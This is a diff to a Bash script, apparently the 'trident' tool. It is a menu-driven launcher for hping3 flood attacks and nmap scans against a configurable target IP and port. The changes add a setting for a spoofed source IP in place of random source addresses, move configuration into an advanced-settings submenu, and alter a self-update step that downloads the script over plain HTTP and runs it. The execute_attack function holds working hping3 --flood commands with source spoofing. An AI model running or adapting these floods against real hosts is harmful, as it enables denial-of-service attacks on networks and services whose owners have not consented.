@@ -2,7 +2,7 @@
 # Repository <https://github.com/sshpc/trident>
 export LANG=en_US.UTF-8
 
-selfversion='0.3'
+selfversion='0.4'
 datevar=$(date +%Y-%m-%d_%H:%M:%S)
 menuname='首页'
 parentfun=''
@@ -17,7 +17,8 @@ trap cleanup EXIT
 
 # 全局变量
 TARGET_IP=""
-DURATION=60
+SOURCE_IP=""
+DURATION=10
 PACKET_SIZE=120
 TARGET_PORT=80
 CONCURRENT_ATTACKS=0
@@ -148,6 +149,8 @@ menutop() {
 # 菜单渲染
 menu() {
     menutop
+    source "$CONFIG_FILE" # 重新加载配置
+
     local options=("$@")
     local num_options=${#options[@]}
     local max_len=0
@@ -196,7 +199,7 @@ log_action() {
 
 # 封装保存配置到文件的函数
 save_config() {
-    echo -e "TARGET_IP=$TARGET_IP\nDURATION=$DURATION\nPACKET_SIZE=$PACKET_SIZE\nTARGET_PORT=$TARGET_PORT" >"$CONFIG_FILE"
+    echo -e "TARGET_IP=$TARGET_IP\nDURATION=$DURATION\nPACKET_SIZE=$PACKET_SIZE\nTARGET_PORT=$TARGET_PORT\nSOURCE_IP=$SOURCE_IP" >"$CONFIG_FILE"
     _green "配置已保存到 $CONFIG_FILE"
 }
 
@@ -228,8 +231,8 @@ configure_packet_size() {
 
 # 配置持续时间
 configure_duration() {
-    read -ep "请输入持续时间(秒，默认 60): " duration
-    duration=${duration:-60}
+    read -ep "请输入持续时间(秒，默认 10): " duration
+    duration=${duration:-10}
     DURATION=$duration
     save_config
 }
@@ -242,6 +245,12 @@ configure_target_port() {
     save_config
 }
 
+configure_source_ip() {
+    read -ep "请输入源IP地址(为空则随机ip): " source_ip
+    SOURCE_IP=$source_ip
+    save_config
+}
+
 # 执行攻击的通用函数
 execute_attack() {
     local attack_type=$1
@@ -251,18 +260,26 @@ execute_attack() {
     local packet_size=$5
     local duration=$6
 
-    log_action "Attack Start" "hping3 -c $((duration * 1000)) -d $packet_size $attack_flag -p $target_port --flood --rand-source $target_ip"
+    local sourcepattern="--rand-source"
+
+    #判断来源IP不为空
+    
+    if [[ -n "$SOURCE_IP" ]]; then
+        sourcepattern="-a $SOURCE_IP"
+    fi
+
+    log_action "Attack Start" "hping3 -c $((duration * 1000)) -d $packet_size $attack_flag -p $target_port --flood $sourcepattern $target_ip"
 
     if [[ "$attack_type" == "ICMP" ]]; then
         _yellow "攻击类型: $attack_type"
         _yellow "目标: $target_ip"
-        _yellow "命令: hping3 -c $((duration * 1000)) -d $packet_size $attack_flag --flood --rand-source $target_ip"
-        hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag --flood --rand-source "$target_ip" &
+        _yellow "命令: hping3 -c $((duration * 1000)) -d $packet_size $attack_flag --flood $sourcepattern $target_ip"
+        hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag --flood $sourcepattern "$target_ip" &
     else
         _yellow "攻击类型: $attack_type"
         _yellow "目标: $target_ip:$target_port"
-        _yellow "命令: hping3 -c $((duration * 1000)) -d $packet_size $attack_flag -p $target_port --flood --rand-source $target_ip"
-        hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag -p "$target_port" --flood --rand-source "$target_ip" &
+        _yellow "命令: hping3 -c $((duration * 1000)) -d $packet_size $attack_flag -p $target_port --flood $sourcepattern $target_ip"
+        hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag -p "$target_port" --flood $sourcepattern "$target_ip" &
     fi
 }
 # 新增参数验证函数
@@ -411,11 +428,34 @@ nmap_scan() {
 
 # 升级脚本函数
 update_script() {
-    wget -N http://raw.githubusercontent.com/sshpc/trident/main/run.sh && chmod +x run.sh && sudo ./run.sh
+    wget -N http://raw.githubusercontent.com/sshpc/trident/main/run.sh
+    # 检查上一条命令的退出状态码
+        if [ $? -eq 0 ]; then
+            jumpfun '卸载旧版临时文件'
+            rm -rf $TRIDENT_TMP_DIR
+            jumpfun '更新成功'
+            chmod +x ./run.sh && ./run.sh
+        else
+            _red "下载失败,请重试"
+        fi
 }
 
 cat_log(){
+    _yellow "tail -20 $LOG_FILE"
     tail -20 $LOG_FILE
+}
+
+# 高级设置
+advanced_settings() {
+    menuname="首页/高级设置"
+    options=(
+        "配置-目标 IP" configure_target_ip
+        "配置-数据包大小" configure_packet_size
+        "配置-持续时间" configure_duration
+        "配置-目标端口" configure_target_port
+        "配置-来源 IP" configure_source_ip
+    )
+    menu "${options[@]}"
 }
 
 # 主菜单
@@ -429,13 +469,10 @@ main() {
     options=(
         "全自动攻击" auto_attack
         "手动攻击" hping3_attack
-        "配置-目标 IP" configure_target_ip
-        "配置-数据包大小" configure_packet_size
-        "配置-持续时间" configure_duration
-        "配置-目标端口" configure_target_port
         "端口扫描" nmap_scan
-        "升级脚本" "update_script"
-        "查看日志" "cat_log"
+        "升级脚本" update_script
+        "高级设置" advanced_settings
+        "查看日志" cat_log
     )
     menu "${options[@]}"
 }
